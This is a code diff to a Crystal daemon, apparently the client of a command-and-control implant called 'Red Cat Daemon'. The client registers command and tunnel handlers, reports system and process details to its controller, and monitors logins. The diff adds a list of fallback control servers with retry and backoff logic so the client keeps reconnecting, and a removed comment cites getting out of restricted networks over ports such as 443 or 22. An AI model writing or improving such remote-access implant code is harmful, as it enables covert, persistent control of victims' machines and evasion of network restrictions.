@@ -8,7 +8,7 @@ require "./src/handlers/commands.cr"
 require "./src/handlers/tunnel.cr"
 
 # ── Identity (compile-time constants) ────────────────────────────────────
-# Paste values from: ruby keys/generate.rb
+# Populated by tools/build_client.rb or manually from: ruby keys/generate.rb
 TRUSTED_SERVER_KEYS = [
   "",
 ].map { |hex| hex.hexbytes }
@@ -16,6 +16,13 @@ TRUSTED_SERVER_KEYS = [
 CLIENT_PRIVATE_KEY = ""
 CLIENT_IDENTITY    = Crypto::Ed25519::KeyPair.new(CLIENT_PRIVATE_KEY.hexbytes)
 
+# ── Control servers (tried in order) ────────────────────────────────────
+# Each entry is {host, port}. The daemon cycles through them on failure.
+SERVERS = [
+  {host: "127.0.0.1", port: 32435},
+] of NamedTuple(host: String, port: Int32)
+
+RESPECT_TRIES = true
 
 class ProtocolClient
   getter dispatcher : Dispatcher
@@ -89,11 +96,17 @@ class ProtocolClient
     @dispatcher.on_unhandled(&block)
   end
 
-  def prepare_reconnect : Nil
+  def prepare_reconnect(host : String? = nil, port : Int32? = nil) : Nil
     @running = false
     @sock.disconnect rescue nil
+    @host = host if host
+    @port = port if port
     @sock = SocketManager.new(@host, @port, connect_timeout: 5.seconds)
     @session = Diffie::Session.new(Diffie::Role::Client)
+  end
+
+  def current_server : {String, Int32}
+    {@host, @port}
   end
 
   private def read_one_record : Bytes
@@ -144,31 +157,15 @@ class ProtocolClient
 end
 
 # ── main ──────────────────────────────────────────────────────────────────────
-# Static Strings
 
-
-# How many time's to try the connection;
 MAX_RETRIES   = 3
-# how long to wait, per connect attempt
 RETRY_DELAY   = 3.seconds
-# If all 3 fail's how long should we wait again?
 BACKOFF_DELAY = 5.minutes
 
-# 红猫 Deamon (Red Cat Deamon)
+server_idx = 0
+srv = SERVERS[server_idx]
+client = ProtocolClient.new(srv[:host], srv[:port], CLIENT_IDENTITY, TRUSTED_SERVER_KEYS)
 
-# TODO: Add Multiple Control server support;
-# With a queue format, if first fail, then attempt second, and so on. 
-# Still respect MAX_RETRIES (optional), argument such as RESPECT_TRIES?; where if so, each host will be tested 3 time's before moving forward;
-# If all fail, we respect BACKOFF_DELAY;
-# Reason for List rather than single? In case of client being behind a restricted net, we can setup multiple port's
-# 32422? 443? 22? (OKAY)
-# Or Control Server primary crashed! Connect to backup.
-
-
-client = ProtocolClient.new("<contrller>", <port>, CLIENT_IDENTITY, TRUSTED_SERVER_KEYS)
-
-
-# Register handlers once — they persist across reconnects.
 Handlers.register(client)
 TunnelHandler.register(client)
 
@@ -186,20 +183,23 @@ client.on_unhandled do |env|
   STDERR.puts "[unhandled] event=#{env.event} payload=#{env.payload}"
 end
 
-# Graceful shutdown
 daemon_running = true
 Signal::INT.trap { daemon_running = false }
 Signal::TERM.trap { daemon_running = false }
 
-failures = 0
+host_failures = 0
+total_failures = 0
 
 while daemon_running
+  host, port = client.current_server
+
   begin
     client.connect
-    STDERR.puts "[+] connected, handshake complete"
+    STDERR.puts "[+] connected to #{host}:#{port}"
     client.send("stablish", Sysinfo.collect_process)
     LoginMonitor.start(client)
-    failures = 0
+    host_failures = 0
+    total_failures = 0
 
     while client.running? && daemon_running
       sleep 1.second
@@ -208,24 +208,33 @@ while daemon_running
     break unless daemon_running
     STDERR.puts "[!] connection lost"
   rescue ex : Transport::Error
-    STDERR.puts "[!] #{ex.message}"
+    STDERR.puts "[!] #{host}:#{port} — #{ex.message}"
   rescue ex : Diffie::Error
-    STDERR.puts "[!] #{ex.message}"
+    STDERR.puts "[!] #{host}:#{port} — #{ex.message}"
   end
 
   LoginMonitor.stop
+  host_failures += 1
 
-  failures += 1
-  if failures >= MAX_RETRIES
-    STDERR.puts "[!] #{failures} consecutive failures, retrying in 5 minutes..."
-    300.times do
+  advance = RESPECT_TRIES ? host_failures >= MAX_RETRIES : true
+
+  if advance
+    host_failures = 0
+    server_idx = (server_idx + 1) % SERVERS.size
+    total_failures += 1
+
+    if total_failures >= SERVERS.size
+      STDERR.puts "[!] all #{SERVERS.size} server(s) exhausted, backing off #{BACKOFF_DELAY.total_seconds.to_i}s..."
+      BACKOFF_DELAY.total_seconds.to_i.times do
+        break unless daemon_running
+        sleep 1.second
+      end
+      total_failures = 0
       break unless daemon_running
-      sleep 1.second
     end
-    failures = 0
   else
     delay = RETRY_DELAY.total_seconds.to_i
-    STDERR.puts "[*] reconnecting (#{failures}/#{MAX_RETRIES}) in #{delay}s..."
+    STDERR.puts "[*] retry #{host_failures}/#{MAX_RETRIES} on #{host}:#{port} in #{delay}s..."
     delay.times do
       break unless daemon_running
       sleep 1.second
@@ -233,7 +242,8 @@ while daemon_running
   end
 
   break unless daemon_running
-  client.prepare_reconnect
+  next_srv = SERVERS[server_idx]
+  client.prepare_reconnect(next_srv[:host], next_srv[:port])
 end
 
 LoginMonitor.stop
